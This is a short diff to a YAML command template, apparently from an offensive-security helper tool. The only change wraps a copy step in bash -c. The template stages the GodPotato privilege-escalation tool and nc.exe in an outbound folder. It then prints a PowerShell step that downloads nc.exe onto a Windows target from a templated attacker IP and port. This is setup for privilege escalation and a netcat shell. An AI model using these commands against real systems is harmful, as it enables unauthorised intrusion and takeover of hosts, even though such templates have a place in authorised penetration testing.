@@ -6,7 +6,7 @@ metadata:
   authors: ["Unknown"]
 
 content: |
-  mkdir -p packstation/outbound; cp -n {{ tools_dir }}/godpotato/* /usr/share/windows-resources/binaries/nc.exe packstation/outbound/; \
+  mkdir -p packstation/outbound; bash -c 'cp -n {{ tools_dir }}/godpotato/* /usr/share/windows-resources/binaries/nc.exe packstation/outbound/'; \
   echo '================================================================'; \
   echo '                      -----PowerShell-----                      '; \
   echo 'Preparation 1 (deliver nc.exe): iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/nc.exe -Outfile {{ delivery_path_windows }}\nc.exe'; \
